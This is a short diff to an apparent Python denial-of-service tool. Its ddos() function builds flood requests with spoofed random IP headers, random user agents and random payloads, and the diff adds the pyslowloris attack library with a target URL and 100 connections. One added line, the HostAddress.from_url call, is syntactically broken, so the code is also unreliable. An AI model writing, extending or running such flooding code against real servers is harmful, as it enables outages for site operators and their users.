@@ -2,6 +2,7 @@ import random, socket, threading
 import os, socket, threading, colorsys, time, random
 import socket
 import sys
+from pyslowloris import HostAddress, SlowLorisAttack
 from os import system, name
 import httpx
 from httpx import AsyncClient, Headers
@@ -2456,6 +2457,8 @@ def ddos():
         0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
             random.randint(0, 255)) + "\r\n"
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+    url = HostAddress.from_url("("http://" + ip)")
+    connections_count = 100
     request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     data = random._urandom(1067)
     data1 = random._urandom(1166)
